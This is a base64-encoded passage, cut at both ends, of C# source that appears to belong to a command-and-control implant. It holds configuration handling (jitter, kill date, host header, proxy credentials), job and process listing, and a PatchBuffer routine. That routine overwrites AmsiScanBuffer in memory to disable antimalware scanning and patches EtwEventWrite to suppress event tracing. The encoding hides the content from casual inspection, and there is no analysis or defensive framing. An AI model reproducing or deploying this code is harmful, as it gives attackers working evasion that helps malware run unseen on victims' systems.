ICBDb25maWcuSml0dGVyID0gaW50LlBhcnNlKGFyZ3NbMV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImtpbGxfZGF0ZSI6DQogICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuS2lsbERhdGUgPSBhcmdzWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImhvc3RfaGVhZGVyIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Ib3N0SGVhZGVyID0gYXJnc1sxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJ1c2VyX2FnZW50IjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyB1YSA9IHN0cmluZy5Kb2luKCIgIiwgYXJncyk7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuVXNlckFnZW50ID0gdWEuU3Vic3RyaW5nKDExKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJwYXJhbSI6DQogICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuUGFyYW0gPSBhcmdzWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgInByb3h5IjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoYXJnc1sxXSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJ1c2VfZGVmYXVsdCI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhcmdzWzJdLlRvTG93ZXIoKSA9PSAiZmFsc2UiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuRGVmYXVsdFByb3h5ID0gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuRGVmYXVsdFByb3h5ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJhZGRyZXNzIjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlByb3h5QWRkcmVzcyA9IGFyZ3NbMl07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInVzZXJuYW1lIjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlByb3h5VXNlciA9IGFyZ3NbMl07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInBhc3N3b3JkIjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlByb3h5UGFzc3dvcmQgPSBhcmdzWzJdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIExvYWRMaWJyYXJ5KHN0cmluZyBscEZpbGVOYW1lKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBVSW50UHRyIGR3U2l6ZSwgdWludCBmbE5ld1Byb3RlY3QsIG91dCB1aW50IGxwZmxPbGRQcm90ZWN0KTsNCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgUGF0Y2hCdWZmZXIoKQ0KICAgICAgICB7DQogICAgICAgICAgICBieXRlW10gcGF0Y2g7DQogICAgICAgICAgICBpZiAoSW50UHRyLlNpemUgPT0gOCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwYXRjaCA9IG5ldyBieXRlWzZdOw0KICAgICAgICAgICAgICAgIHBhdGNoWzBdID0gMHhCODsNCiAgICAgICAgICAgICAgICBwYXRjaFsxXSA9IDB4NTc7DQogICAgICAgICAgICAgICAgcGF0Y2hbMl0gPSAweDAwOw0KICAgICAgICAgICAgICAgIHBhdGNoWzNdID0gMHgwNzsNCiAgICAgICAgICAgICAgICBwYXRjaFs0XSA9IDB4ODA7DQogICAgICAgICAgICAgICAgcGF0Y2hbNV0gPSAweGMzOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHBhdGNoID0gbmV3IGJ5dGVbOF07DQogICAgICAgICAgICAgICAgcGF0Y2hbMF0gPSAweEI4Ow0KICAgICAgICAgICAgICAgIHBhdGNoWzFdID0gMHg1NzsNCiAgICAgICAgICAgICAgICBwYXRjaFsyXSA9IDB4MDA7DQogICAgICAgICAgICAgICAgcGF0Y2hbM10gPSAweDA3Ow0KICAgICAgICAgICAgICAgIHBhdGNoWzRdID0gMHg4MDsNCiAgICAgICAgICAgICAgICBwYXRjaFs1XSA9IDB4YzI7DQogICAgICAgICAgICAgICAgcGF0Y2hbNl0gPSAweDE4Ow0KICAgICAgICAgICAgICAgIHBhdGNoWzddID0gMHgwMDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgYnl0ZVtdIG5QYXRjaDsNCiAgICAgICAgICAgIGlmIChJbnRQdHIuU2l6ZSA9PSA4KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIG5QYXRjaCA9IG5ldyBieXRlW10geyAweGMzLCAweDAwIH07DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgblBhdGNoID0gbmV3IGJ5dGVbXSB7IDB4YzIsIDB4MTQsIDB4MDAgfTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQojaWYgTkVUXzQNCiAgICAgICAgICAgICAgICB2YXIgbGlicmFyeSA9IExvYWRMaWJyYXJ5KCJhbXNpLmRsbCIpOw0KICAgICAgICAgICAgICAgIHZhciBhZGRyZXNzID0gR2V0UHJvY0FkZHJlc3MobGlicmFyeSwgIkFtc2lTY2FuQnVmZmVyIik7DQogICAgICAgICAgICAgICAgdWludCBvbGRQcm90ZWN0Ow0KICAgICAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KGFkZHJlc3MsIChVSW50UHRyKXBhdGNoLkxlbmd0aCwgMHg0MCwgb3V0IG9sZFByb3RlY3QpOw0KICAgICAgICAgICAgICAgIE1hcnNoYWwuQ29weShwYXRjaCwgMCwgYWRkcmVzcywgcGF0Y2guTGVuZ3RoKTsNCiAgICAgICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChhZGRyZXNzLCAoVUludFB0cilwYXRjaC5MZW5ndGgsIG9sZFByb3RlY3QsIG91dCBvbGRQcm90ZWN0KTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIHVpbnQgbk9sZFByb3RlY3Q7DQogICAgICAgICAgICAgICAgLy8gaHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAyMC8wMy9oaWRpbmcteW91ci1uZXQtZXR3Lw0KICAgICAgICAgICAgICAgIHZhciBudGRsbCA9IExvYWRMaWJyYXJ5KCJudGRsbC5kbGwiKTsNCiAgICAgICAgICAgICAgICB2YXIgZXR3RXZlbnRTZW5kID0gR2V0UHJvY0FkZHJlc3MobnRkbGwsICJFdHdFdmVudFdyaXRlIik7DQogICAgICAgICAgICAgICAgVmlydHVhbFByb3RlY3QoZXR3RXZlbnRTZW5kLCAoVUludFB0ciluUGF0Y2guTGVuZ3RoLCAweDQwLCBvdXQgbk9sZFByb3RlY3QpOw0KICAgICAgICAgICAgICAgIE1hcnNoYWwuQ29weShuUGF0Y2gsIDAsIGV0d0V2ZW50U2VuZCwgblBhdGNoLkxlbmd0aCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldENvbm5lY3RGYWlscygpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyBhdHRlbXB0cyA9ICIiOw0KICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuU2VydmVyIHNlcnZlciBpbiBDb25maWcuU2VydmVycykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBhdHRlbXB0cyArPSBTdHJpbmcuRm9ybWF0KCJ7MH0gPSB7MX0sICIsIHNlcnZlci5kb21haW4sIHNlcnZlci5jb3VudC5Ub1N0cmluZygpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBhdHRlbXB0czsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldENvbmZpZygpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyBzZXJ2ZXJzID0gIiI7DQogICAgICAgICAgICBmb3JlYWNoIChVdGlscy5TZXJ2ZXIgc2VydmVyIGluIENvbmZpZy5TZXJ2ZXJzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHNlcnZlcnMgKz0gU3RyaW5nLkZvcm1hdCgiezB9ICIsIHNlcnZlci5kb21haW4pOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIFN0cmluZy5Gb3JtYXQoIkRvbWFpbnM6IHswfVxuU2xlZXA6IHsxfVxuSml0dGVyOiB7Mn1cbktpbGwgRGF0ZTogezN9XG5Ib3N0IEhlYWRlcjogezR9XG5Vc2VyLUFnZW50OiB7NX1cbkdFVCBQYXJhbWV0ZXI6IHs2fVxuVXNlIERlZmF1bHQgUHJveHk6IHs3fVxuUHJveHkgQWRkcmVzczogezh9XG5Qcm94eSBVc2VybmFtZTogezl9XG5Qcm94eSBQYXNzd29yZDogezEwfVxuRmFpbGVkIENvbm5lY3Rpb25zOiB7MTF9Iiwgc2VydmVycywgQ29uZmlnLlNsZWVwLlRvU3RyaW5nKCksIENvbmZpZy5KaXR0ZXIuVG9TdHJpbmcoKSwgQ29uZmlnLktpbGxEYXRlLCBDb25maWcuSG9zdEhlYWRlciwgQ29uZmlnLlVzZXJBZ2VudCwgQ29uZmlnLlBhcmFtLCBDb25maWcuRGVmYXVsdFByb3h5LCBDb25maWcuUHJveHlBZGRyZXNzLCBDb25maWcuUHJveHlVc2VyLCBDb25maWcuUHJveHlQYXNzd29yZCwgR2V0Q29ubmVjdEZhaWxzKCkpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIEtpbGxKb2IoVXRpbHMuSm9iTGlzdCBqb2JMaXN0LCBpbnQgam9iTnVtKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpbnQgY291bnQgPSAwOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBqb2IgaW4gam9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGpvYi5qb2JfaWQgPT0gam9iTnVtKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBqb2JMaXN0LmpvYnNbam9iTnVtXS50aHJlYWQuQWJvcnQoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGpvYkxpc3Quam9icy5SZW1vdmVBdChjb3VudCk7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBjb3VudCsrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0Sm9icyhVdGlscy5Kb2JMaXN0IGpvYkxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyBqb2JzID0gIkpvYiBJRFx0VGFzayBJRFx0XHRcdFx0XHRDb21tYW5kXHRcdFBhcmFtZXRlcnNcbi0tLS0tLVx0LS0tLS0tLVx0XHRcdFx0XHQtLS0tLS0tXHRcdC0tLS0tLS0tLVxuIjsNCiAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBqb2IgaW4gam9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGpvYnMgKz0gU3RyaW5nLkZvcm1hdCgiezB9XHR7MX1cdHsyfVx0XHR7M31cbiIsIGpvYi5qb2JfaWQsIGpvYi50YXNrX2lkLCBqb2IuY29tbWFuZCwgam9iLnBhcmFtZXRlcnMuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBqb2JzOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gTW9zdCBvZiB0aGlzIGNvZGUgaXMgZGlyZWN0bHkgZnJvbSBTaGFyU3Bsb2l0OiBodHRwczovL2dpdGh1Yi5jb20vY29iYnIvU2hhcnBTcGxvaXQNCiAgICAgICAgcHVibGljIGNsYXNzIFByb2Nlc3NMaXN0DQogICAgICAgIHsNCiAgICAgICAgICAgIHByaXZhdGUgc3RydWN0IFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04NCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwcml2YXRlIEludFB0ciBFeGl0U3RhdHVzOw0KICAgICAgICAgICAgICAgIHByaXZhdGUgSW50UHRyIFBlYkJhc2VBZGRyZXNzOw0KICAgICAgICAgICAgICAgIHByaXZhdGUgSW50UHRyIEFmZmluaXR5TWFzazsNCiAgICAgICAgICAgICAgICBwcml2YXRlIEludFB0ciBCYXNlUHJpb3JpdHk7DQogICAgICAgICAgICAgICAgcHJpdmF0ZSBVSW50UHRyIFVuaXF1ZVByb2Nlc3NJZDsNCiAgICAgICAgICAgICAgICBwdWJsaWMgaW50IEluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQ7DQoNCiAgICAgICAgICAgICAgICBwcml2YXRlIGludCBTaXplDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBnZXQgeyByZXR1cm4gKGludClNYXJzaGFsLlNpemVPZih0eXBlb2YoUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTikpOyB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwcml2YXRlIGVudW0gUFJPQ0VTU0lORk9DTEFTUyA6IGludA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFByb2Nlc3NCYXNpY0luZm9ybWF0aW9uID0gMCwgLy8gMCwgcTogUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTiwgUFJPQ0VTU19FWFRFTkRFRF9CQVNJQ19JTkZPUk1BVElPTg0KICAgICAgICAgICAgICAgIFByb2Nlc3NRdW90YUxpbWl0cywgLy8gcXM6IFFVT1RBX0xJTUlUUywgUVVPVEFfTElNSVRTX0VYDQogICAgICAgICAgICAgICAgUHJvY2Vzc0lvQ291bnRlcnMsIC8vIHE6IElPX0NPVU5URVJTDQogICAgICAgICAgICAgICAgUHJvY2Vzc1ZtQ291bnRlcnMsIC8vIHE6IFZNX0NPVU5URVJTLCBWTV9DT1VOVEVSU19FWA0KICAgICAgICAgICAgICAgIFByb2Nlc3NUaW1lcywgLy8gcTogS0VSTkVMX1VTRVJfVElNRVMNCiAgICAgICAgICAgICAgICBQcm9jZXNzQmFzZVByaW9yaXR5LCAvLyBzOiBLUFJJT1JJVFkNCiAgICAgICAgICAgICAgICBQcm9jZXNzUmFpc2VQcmlvcml0eSwgLy8gczogVUxPTkcNCiAgICAgICAgICAgICAgICBQcm9jZXNzRGVidWdQb3J0LCAvLyBxOiBIQU5ETEUNCiAgICAgICAgICAgICAgICBQcm9jZXNzRXhjZXB0aW9uUG9ydCwgLy8gczogSEFORExFDQogICAgICAgICAgICAgICAgUHJvY2Vzc0FjY2Vzc1Rva2VuLCAvLyBzOiBQUk9DRVNTX0FDQ0VTU19UT0tFTg0KICAgICAgICAgICAgICAgIFByb2Nlc3NMZHRJbmZvcm1hdGlvbiwgLy8gMTANCiAgICAgICAgICAgICAgICBQcm9jZXNzTGR0U2l6ZSwNCiAgICAgICAgICAgICAgICBQcm9jZXNzRGVmYXVsdEhhcmRFcnJvck1vZGUsIC8vIHFzOiBVTE9ORw0KICAgICAgICAgICAgICAgIFByb2Nlc3NJb1BvcnRIYW5kbGVycywgLy8gKGtlcm5lbC1tb2RlIG9ubHkpDQogICAgICAgICAgICAgICAgUHJvY2Vzc1Bvb2xlZFVzYWdlQW5kTGltaXRzLCAvLyBxOiBQT09MRURfVVNBR0VfQU5EX0xJTUlUUw0KICAgICAgICAgICAgICAgIFByb2Nlc3NXb3JraW5nU2V0V2F0Y2gsIC8vIHE6IFBST0NFU1NfV1NfV0FUQ0hfSU5GT1JNQVRJT05bXTsgczogdm9pZA0KICAgICAgICAgICAgICAgIFByb2Nlc3NVc2VyTW9kZUlPUEwsDQogICAgICAgICAgICAgICAgUHJvY2Vzc0VuYWJsZUFsaWdubWVudEZhdWx0Rml4dXAsIC8vIHM6IEJPT0xFQU4NCiAgICAgICAgICAgICAgICBQcm9jZXNzUHJpb3JpdHlDbGFzcywgLy8gcXM6IFBST0NFU1NfUFJJT1JJVFlfQ0xBU1MNCiAgICAgICAgICAgICAgICBQcm9jZXNzV3g4NkluZm9ybWF0aW9uLA0KICAgICAgICAgICAgICAgIFByb2Nlc3NIYW5kbGVDb3VudCwgLy8gMjAsIHE6IFVMT05HLCBQUk9DRVNTX0hBTkRMRV9JTkZPUk1BVElPTg0KICAgICAgICAgICAgICAgIFByb2Nlc3NBZmZpbml0eU1hc2ssIC8vIHM6IEtBRkZJTklUWQ0KICAgICAgICAgICAgICAgIFByb2Nlc3NQcmlvcml0eUJvb3N0LCAvLyBxczogVUxPTkcNCiAgICAgICAgICAgICAgICBQcm9jZXNzRGV2aWNlTWFwLCAvLyBxczogUFJPQ0VTU19ERVZJQ0VNQVBfSU5GT1JNQVRJT04sIFBST0NFU1NfREVWSUNFTUFQX0lORk9STUFUSU9OX0VYDQogICAgICAgICAgICAgICAgUHJvY2Vzc1Nlc3Npb25JbmZvcm1hdGlvbiwgLy8gcTogUFJPQ0VTU19TRVNTSU9OX0lORk9STUFUSU9ODQogICAgICAgICAgICAgICAgUHJvY2Vzc0ZvcmVncm91bmRJbmZvcm1hdGlvbiwgLy8gczogUFJPQ0VTU19GT1JFR1JPVU5EX0JBQ0tHUk9VTkQNCiAgICAgICAgICAgICAgICBQcm9jZXNzV293NjRJbmZvcm1hdGlvbiwgLy8gcTogVUxPTkdfUFRSDQogICAgICAgICAgICAgICAgUHJvY2Vzc0ltYWdlRmlsZU5hbWUsIC8vIHE6IFVOSUNPREVfU1RSSU5HDQogICAgICAgICAgICAgICAgUHJvY2Vzc0xVSUREZXZpY2VNYXBzRW5hYmxlZCwgLy8gcTogVUxPTkcNCiAgICAgICAgICAgICAgICBQcm9jZXNzQnJlYWtPblRlcm1pbmF0aW9uLCAvLyBxczogVUxPTkcNCiAgICAgICAgICAgICAgICBQcm9jZXNzRGVidWdPYmplY3RIYW5kbGUsIC8vIDMwLCBxOiBIQU5ETEUNCiAgICAgICAgICAgICAgICBQcm9jZXNzRGVidWdGbGFncywgLy8gcXM6IFVMT05HDQogICAgICAgICAgICAgICAgUHJvY2Vzc0hhbmRsZVRyYWNpbmcsIC8vIHE6IFBST0NFU1NfSEFORExFX1RSQUNJTkdfUVVFUlk7IHM6IHNpemUgMCBkaXNhYmxlcywgb3RoZXJ3aXNlIGVuYWJsZXMNCiAgICAgICAgICAgICAgICBQcm9jZXNzSW9Qcmlvcml0eSwgLy8gcXM6IFVMT05HDQogICAgICAgICAgICAgICAgUHJvY2Vzc0V4ZWN1dGVGbGFncywgLy8gcXM6IFVMT05HDQogICAgICAgICAgICAgICAgUHJvY2Vzc1Jlc291cmNlTWFuYWdlbWVudCwNCiAgICAgICAgICAgICAgICBQcm9jZXNzQ29va2llLCAvLyBxOiBVTE9ORw0KICAgICAgICAgICAgICAgIFByb2Nlc3NJbWFnZUluZm9ybWF0aW9uLCAvLyBxOiBTRUNUSU9OX0lNQUdFX0lORk9STUFUSU9ODQogICAgICAgICAgICAgICAgUHJvY2Vzc0N5Y2xlVGltZSwgLy8gcTogUFJPQ0VTU19DWUNMRV9USU1FX0lORk9STUFUSU9ODQogICAgICAgICAgICAgICAgUHJvY2Vzc1BhZ2VQcmlvcml0eSwgLy8gcTogVUxPTkcNCiAgICAgICAgICAgICAgICBQcm9jZXNzSW5zdHJ1bWVudGF0aW9uQ2FsbGJhY2ssIC8vIDQwDQogICAgICAgICAgICAgICAgUHJvY2Vzc1RocmVhZFN0YWNrQWxsb2NhdGlvbiwgLy8gczogUFJPQ0VTU19TVEFDS19BTExPQ0FUSU9OX0lORk9STUFUSU9OLCBQUk9DRVNTX1NUQUNLX0FMTE9DQVRJT05fSU5GT1JNQVRJT05fRVgNCiAgICAgICAgICAgICAgICBQcm9jZXNzV29ya2luZ1NldFdhdGNoRXgsIC8vIHE6IFBST0NFU1NfV1NfV0FUQ0hfSU5GT1JNQVRJT05fRVhbXQ0KICAgICAgICAgICAgICAgIFByb2Nlc3NJbWFnZUZpbGVOYW1lV2luMzIsIC8vIHE6IFVOSUNPREVfU1RSSU5HDQogICAgICAgICAgICAgICAgUHJvY2Vzc0ltYWdlRmlsZU1hcHBpbmcsIC8vIHE6IEhBTkRMRSAoaW5wdXQpDQogICAgICAgICAgICAgICAgUHJvY2Vzc0FmZmluaXR5VXBkYXRlTW9kZSwgLy8gcXM6IFBST0NFU1NfQUZGSU5JVFlfVVBEQVRFX01PREUNCiAgICAgICAgICAgICAgICBQcm9jZXNzTWVtb3J5QWxsb2NhdGlvbk1vZGUsIC8vIHFzOiBQUk9DRVNTX01FTU9SWV9BTExPQ0FUSU9OX01PREUNCiAgICAgICAgICAgICAgICBQcm9jZXNzR3JvdXBJbmZvcm1hdGlvbiwgLy8gcTogVVNIT1JUW10NCiAgICAgICAgICAgICAgICBQcm9jZXNzVG9rZW5WaXJ0dWFsaXphdGlvbkVuYWJsZWQsIC8vIHM6IFVMT05HDQogICAgICAgICAgICAgICAgUHJvY2Vzc0NvbnNvbGVIb3N0UHJvY2VzcywgLy8gcTogVUxPTkdfUFRSDQogICAgICAgICAgICAgICAgUHJvY2Vzc1dpbmRvd0luZm9ybWF0aW9uLCAvLyA1MCwgcTogUFJPQ0VTU19XSU5ET1dfSU5GT1JNQVRJT04NCiAgICAgICAgICAgICAgICBQcm9jZXNzSGFuZGxlSW5mb3JtYXRpb24sIC8vIHE6IFBST0NFU1NfSEFORExFX1NOQVBTSE9UX0lORk9STUFUSU9OIC8vIHNpbmNlIFdJTjgNCiAgICAgICAgICAgICAgICBQcm9jZXNzTWl0aWdhdGlvblBvbGljeSwgLy8gczogUFJPQ0VTU19NSVRJR0FUSU9OX1BPTElDWV9JTkZPUk1BVElPTg0KICAgICAgICAgICAgICAgIFByb2Nlc3NEeW5hbWljRnVuY3Rpb25UYWJsZUluZm9ybWF0aW9uLA0KICAgICAgICAgICAgICAgIFByb2Nlc3NIYW5kbGVDaGVja2luZ01vZGUsDQogICAgICAgICAgICAgICAgUHJvY2Vzc0tlZXBBbGl2ZUNvdW50LCAvLyBxOiBQUk9DRVNTX0tFRVBBTElWRV9DT1VOVF9JTkZPUk1BVElPTg0KICAgICAgICAgICAgICAgIFByb2Nlc3NSZXZva2VGaWxlSGFuZGxlcywgLy8gczogUFJPQ0VTU19SRVZPS0VfRklMRV9IQU5ETEVTX0lORk9STUFUSU9ODQogICAgICAgICAgICAgICAgTWF4UHJvY2Vzc0luZm9DbGFzcw0KICAgICAgICAgICAgfTsNCg0KICAgICAgICAgICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MoSW50UHRyIGhQcm9jZXNzLCBQUk9DRVNTSU5GT0NMQVNTIHBpYywgSW50UHRyIHBpLCBpbnQgY2IsIG91dCBpbnQgcFNpemUpOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGludCBHZXRQYXJlbnRQcm9jZXNzKEludFB0ciBIYW5kbGUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaW50IHJldHVybkxlbmd0aDsNCiAgICAgICAgICAgICAgICB2YXIgYmFzaWNQcm9jZXNzSW5mb3JtYXRpb24gPSBuZXcgUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTigpOw0KICAgICAgICAgICAgICAgIEludFB0ciBwUHJvY0luZm8gPSBNYXJzaGFsLkFsbG9jSEdsb2JhbChNYXJzaGFsLlNpemVPZihiYXNpY1Byb2Nlc3NJbmZvcm1hdGlvbikpOw0KICAgICAgICAgICAgICAgIE1hcnNoYWwuU3RydWN0dXJlVG9QdHIoYmFzaWNQcm9jZXNzSW5mb3JtYXRpb24sIHBQcm9jSW5mbywgdHJ1ZSk7DQogICAgICAgICAgICAgICAgTnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhIYW5kbGUsIFBST0NFU1NJTkZPQ0xBU1MuUHJvY2Vzc0Jhc2ljSW5mb3JtYXRpb24sIHBQcm9jSW5mbywgTWFyc2hhbC5TaXplT2YoYmFzaWNQcm9jZXNzSW5mb3JtYXRpb24pLCBvdXQgcmV0dXJuTGVuZ3RoKTsNCiAgICAgICAgICAgICAgICBiYXNpY1Byb2Nlc3NJbmZvcm1hdGlvbiA9IChQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OKU1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUocFByb2NJbmZvLCB0eXBlb2YoUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTikpOw0KDQogICAgICAgICAgICAgICAgcmV0dXJuIGJhc2ljUHJvY2Vzc0luZm9ybWF0aW9uLkluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQ7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEJvb2xlYW4gT3BlblByb2Nlc3NUb2tlbihJbnRQdHIgaFByb2Nlc3MsIFVJbnQzMiBkd0Rlc2lyZWRBY2Nlc3MsIG91dCBJbnRQdHIgaFRva2VuKTsNCg0KICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgc3RyaW5nIEdldFByb2Nlc3NPd25lcihQcm9jZXNzIFByb2Nlc3MpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBJ